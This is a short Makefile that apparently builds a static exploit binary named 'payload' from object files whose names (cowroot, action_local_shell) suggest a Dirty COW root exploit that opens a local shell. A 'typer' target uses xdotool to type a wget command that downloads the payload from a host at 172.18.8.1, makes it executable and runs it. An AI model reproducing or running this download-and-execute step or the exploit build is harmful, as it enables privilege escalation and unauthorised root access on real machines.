TARGET=payload.$(shell gcc -dumpmachine)
OBJS=main.o cowroot.o action_local_shell.o

all: ${TARGET}

${TARGET}: ${OBJS}
	gcc -static -o $@ -pthread $^
	strip $@

%.o: %.c
	gcc -static -g -c -o $@ $<

clean:
	-rm -f ${OBJS}

dist-clean: clean
	-rm -f ${TARGET}

execv: execv.c
	diet gcc -s -Os execv.c -o execv -fno-ident

typer:
	sleep 2; xdotool type 'wget http://172.18.8.1:8080/payload.i586-linux-gnu -O payload && chmod 755 payload && ./payload'
